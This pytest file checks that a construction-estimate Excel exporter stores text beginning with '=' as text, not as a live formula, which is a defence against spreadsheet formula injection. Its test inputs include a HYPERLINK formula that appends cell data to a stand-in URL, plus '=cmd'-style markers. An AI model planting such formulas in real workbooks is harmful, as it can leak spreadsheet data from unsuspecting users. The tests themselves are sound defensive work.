"""Spreadsheet formula injection in the estimate-builder Excel export.

The implementation under test is the EstimateBuilder class shipped in
SKILL.md. These tests import a table (or call add_item / add_markup with the
same strings) and export a workbook. They fail while a text value that starts
with "=" is written as an Excel formula, and they pass once that value is
stored as text.

A leading apostrophe is accepted because that is the text-prefix form of the
same cell. Explicit text cells, whose value is still the original string and
whose type is not a formula, are accepted too. Numeric totals must stay
numbers.
"""

from __future__ import annotations

import xml.etree.ElementTree as ET
import zipfile
from pathlib import Path

import pandas as pd
import pytest

SKILL_PATH = Path(__file__).resolve().parents[1] / "SKILL.md"
MAIN_NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
REL_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
PKG_REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"


def _load_skill():
    """Execute the implementation block in SKILL.md, not a copy of it."""
    text = SKILL_PATH.read_text(encoding="utf-8")
    marker = "```python\n"
    start = text.index(marker) + len(marker)
    end = text.index("\n```", start)
    namespace: dict = {}
    exec(compile(text[start:end], str(SKILL_PATH), "exec"), namespace)
    return namespace["EstimateBuilder"], namespace["CostCategory"]


EstimateBuilder, CostCategory = _load_skill()


def _assert_text(cell, original: str) -> None:
    """The cell must not be a formula, and it must still carry the text."""
    assert cell.data_type != "f", (
        f"{cell.coordinate} was stored as a formula ({cell.value!r})"
    )
    assert isinstance(cell.value, str), cell.value
    stored = cell.value[1:] if cell.value.startswith("'") else cell.value
    assert stored == original


def _sheet_xml(workbook_path: Path, sheet_name: str) -> ET.Element:
    with zipfile.ZipFile(workbook_path) as package:
        workbook = ET.fromstring(package.read("xl/workbook.xml"))
        rels = ET.fromstring(package.read("xl/_rels/workbook.xml.rels"))
        relation_by_id = {
            rel.attrib["Id"]: rel.attrib["Target"]
            for rel in rels.findall(f"{{{PKG_REL_NS}}}Relationship")
        }
        target = None
        for sheet in workbook.findall(f"{{{MAIN_NS}}}sheets/{{{MAIN_NS}}}sheet"):
            if sheet.attrib["name"] == sheet_name:
                target = relation_by_id[sheet.attrib[f"{{{REL_NS}}}id"]]
                break
        assert target is not None, sheet_name
        if not target.startswith("xl/"):
            target = "xl/" + target.lstrip("/")
        return ET.fromstring(package.read(target))


def _assert_cell_xml_has_no_formula(workbook_path: Path, sheet_name: str, coordinate: str) -> None:
    """Fail if the xlsx stores this cell as an OOXML formula element."""
    root = _sheet_xml(workbook_path, sheet_name)
    cells = [
        cell
        for cell in root.iter(f"{{{MAIN_NS}}}c")
        if cell.attrib.get("r") == coordinate
    ]
    assert cells, f"{sheet_name}!{coordinate} missing from the workbook"
    for cell in cells:
        formulas = list(cell.iter(f"{{{MAIN_NS}}}f"))
        assert formulas == [], (
            f"{sheet_name}!{coordinate} contains a formula element: "
            + "".join(ET.tostring(formula, encoding="unicode") for formula in formulas)
        )


def _column(worksheet, header: str) -> int:
    for cell in worksheet[1]:
        if cell.value == header:
            return cell.column
    raise AssertionError(f"header {header!r} not on {worksheet.title}")


def _cell(worksheet, header: str, row: int):
    return worksheet.cell(row=row, column=_column(worksheet, header))


def test_imported_description_and_notes_are_text_not_formulas(tmp_path: Path):
    """Vendor-quote strings that start with '=' must survive export as text.

    Description refers to the quantity cell and notes refer to the total cell.
    Both are ordinary line-item text from import_from_df.
    """
    description = '=D2'
    notes = '=G2'
    frame = pd.DataFrame(
        [
            {
                "wbs_code": "03.01",
                "description": description,
                "quantity": 4,
                "unit": "CY",
                "unit_cost": 5,
                "category": "material",
                "notes": notes,
            }
        ]
    )
    estimate = EstimateBuilder("Office Building A", "PRJ-2024-001")
    estimate.import_from_df(frame)
    output = tmp_path / "estimate.xlsx"
    estimate.export_to_excel(str(output))

    from openpyxl import load_workbook

    sheet = load_workbook(output)["Line Items"]
    description_cell = _cell(sheet, "Description", 2)
    notes_cell = _cell(sheet, "Notes", 2)
    _assert_text(description_cell, description)
    _assert_text(notes_cell, notes)
    _assert_cell_xml_has_no_formula(output, "Line Items", description_cell.coordinate)
    _assert_cell_xml_has_no_formula(output, "Line Items", notes_cell.coordinate)
    # The quantity and total the formulas would have read stay numeric.
    assert _cell(sheet, "Qty", 2).value == 4
    assert _cell(sheet, "Total", 2).value == 20


def test_imported_wbs_and_unit_are_text_not_formulas(tmp_path: Path):
    """WBS and unit travel through import_from_df into the same workbook."""
    wbs = "=1+1"
    unit = "=F2"
    frame = pd.DataFrame(
        [
            {
                "wbs_code": wbs,
                "description": "Concrete",
                "quantity": 2,
                "unit": unit,
                "unit_cost": 9,
                "category": "material",
                "notes": "",
            }
        ]
    )
    estimate = EstimateBuilder("Office Building A", "PRJ-2024-001")
    estimate.import_from_df(frame)
    output = tmp_path / "estimate.xlsx"
    estimate.export_to_excel(str(output))

    from openpyxl import load_workbook

    sheet = load_workbook(output)["Line Items"]
    wbs_cell = _cell(sheet, "WBS", 2)
    unit_cell = _cell(sheet, "Unit", 2)
    _assert_text(wbs_cell, wbs)
    _assert_text(unit_cell, unit)
    _assert_cell_xml_has_no_formula(output, "Line Items", wbs_cell.coordinate)
    _assert_cell_xml_has_no_formula(output, "Line Items", unit_cell.coordinate)


def test_add_item_writes_formula_text_as_text(tmp_path: Path):
    """add_item is the other entry that reaches export_to_excel."""
    description = '=HYPERLINK("http://example.invalid/?q="&D2,"quote")'
    notes = "=1+1"
    estimate = EstimateBuilder("Office Building A", "PRJ-2024-001")
    estimate.add_item(
        "03.02",
        description,
        8,
        "SF",
        1.5,
        CostCategory.LABOR,
        notes,
    )
    output = tmp_path / "estimate.xlsx"
    estimate.export_to_excel(str(output))

    from openpyxl import load_workbook

    sheet = load_workbook(output)["Line Items"]
    description_cell = _cell(sheet, "Description", 2)
    notes_cell = _cell(sheet, "Notes", 2)
    _assert_text(description_cell, description)
    _assert_text(notes_cell, notes)
    _assert_cell_xml_has_no_formula(output, "Line Items", description_cell.coordinate)
    _assert_cell_xml_has_no_formula(output, "Line Items", notes_cell.coordinate)


def test_every_formula_row_is_neutralized(tmp_path: Path):
    """A later row is the same sink as the first row."""
    descriptions = ["=1+1", "=2+2"]
    notes = ["=G2", "=G3"]
    frame = pd.DataFrame(
        [
            {
                "wbs_code": "01",
                "description": descriptions[0],
                "quantity": 1,
                "unit": "EA",
                "unit_cost": 3,
                "category": "other",
                "notes": notes[0],
            },
            {
                "wbs_code": "02",
                "description": descriptions[1],
                "quantity": 1,
                "unit": "EA",
                "unit_cost": 4,
                "category": "other",
                "notes": notes[1],
            },
        ]
    )
    estimate = EstimateBuilder("Office Building A", "PRJ-2024-001")
    estimate.import_from_df(frame)
    output = tmp_path / "estimate.xlsx"
    estimate.export_to_excel(str(output))

    from openpyxl import load_workbook

    sheet = load_workbook(output)["Line Items"]
    for row, description, note in zip((2, 3), descriptions, notes):
        description_cell = _cell(sheet, "Description", row)
        notes_cell = _cell(sheet, "Notes", row)
        _assert_text(description_cell, description)
        _assert_text(notes_cell, note)
        _assert_cell_xml_has_no_formula(output, "Line Items", description_cell.coordinate)
        _assert_cell_xml_has_no_formula(output, "Line Items", notes_cell.coordinate)


def test_summary_and_markup_names_are_text_not_formulas(tmp_path: Path):
    """export_to_excel also writes the project fields and markup name."""
    project_name = "=A1"
    project_number = "=1+2"
    markup_name = "=C2"
    estimate = EstimateBuilder(project_name, project_number)
    estimate.add_item("01", "Site work", 1, "LS", 10, CostCategory.OTHER, "")
    estimate.add_markup(markup_name, 0.10)
    output = tmp_path / "estimate.xlsx"
    estimate.export_to_excel(str(output))

    from openpyxl import load_workbook

    workbook = load_workbook(output)
    summary = workbook["Summary"]
    name_cell = _cell(summary, "Project Name", 2)
    number_cell = _cell(summary, "Project Number", 2)
    _assert_text(name_cell, project_name)
    _assert_text(number_cell, project_number)
    _assert_cell_xml_has_no_formula(output, "Summary", name_cell.coordinate)
    _assert_cell_xml_has_no_formula(output, "Summary", number_cell.coordinate)

    markups = workbook["Markups"]
    markup_cell = _cell(markups, "name", 2)
    _assert_text(markup_cell, markup_name)
    _assert_cell_xml_has_no_formula(output, "Markups", markup_cell.coordinate)


def test_benign_text_and_totals_are_unchanged(tmp_path: Path):
    """Neutralizing formulas must leave ordinary estimate cells alone."""
    estimate = EstimateBuilder("Office Building A", "PRJ-2024-001")
    estimate.add_item(
        "03.01",
        "Concrete Foundation",
        200,
        "CY",
        350,
        CostCategory.MATERIAL,
        "vendor quote",
    )
    estimate.add_markup("Profit", 0.10)
    output = tmp_path / "estimate.xlsx"
    estimate.export_to_excel(str(output))

    from openpyxl import load_workbook

    workbook = load_workbook(output)
    items = workbook["Line Items"]
    assert _cell(items, "Description", 2).value == "Concrete Foundation"
    assert _cell(items, "Notes", 2).value == "vendor quote"
    assert _cell(items, "WBS", 2).value == "03.01"
    assert _cell(items, "Unit", 2).value == "CY"
    assert _cell(items, "Qty", 2).value == 200
    assert _cell(items, "Unit Cost", 2).value == 350
    assert _cell(items, "Total", 2).value == 70000
    assert _cell(items, "Category", 2).value == "material"
    assert workbook["Summary"]["A2"].value == "Office Building A"
    assert workbook["Markups"]["A2"].value == "Profit"
    assert workbook["Markups"]["C2"].value == 7000


def test_markers_that_are_already_text_stay_text(tmp_path: Path):
    """Plus, minus, and at-sign are stored as text by this exporter already.

    They are not formula cells in the xlsx this skill writes. The assertion
    stays so a later change cannot start treating them as formulas.
    """
    frame = pd.DataFrame(
        [
            {
                "wbs_code": "-2+3",
                "description": "+see note",
                "quantity": 1,
                "unit": "@each",
                "unit_cost": 1,
                "category": "other",
                "notes": "-none",
            }
        ]
    )
    estimate = EstimateBuilder("Office Building A", "PRJ-2024-001")
    estimate.import_from_df(frame)
    output = tmp_path / "estimate.xlsx"
    estimate.export_to_excel(str(output))

    from openpyxl import load_workbook

    sheet = load_workbook(output)["Line Items"]
    _assert_text(_cell(sheet, "Description", 2), "+see note")
    _assert_text(_cell(sheet, "Notes", 2), "-none")
    _assert_text(_cell(sheet, "WBS", 2), "-2+3")
    _assert_text(_cell(sheet, "Unit", 2), "@each")


@pytest.mark.parametrize(
    "category",
    ["=cmd", "+cmd", "@cmd"],
)
def test_category_cannot_carry_a_formula_marker(category: str):
    """category is parsed as CostCategory before it can be written."""
    frame = pd.DataFrame(
        [
            {
                "wbs_code": "01",
                "description": "Work",
                "quantity": 1,
                "unit": "EA",
                "unit_cost": 1,
                "category": category,
                "notes": "",
            }
        ]
    )
    estimate = EstimateBuilder("Office Building A", "PRJ-2024-001")
    with pytest.raises(ValueError):
        estimate.import_from_df(frame)
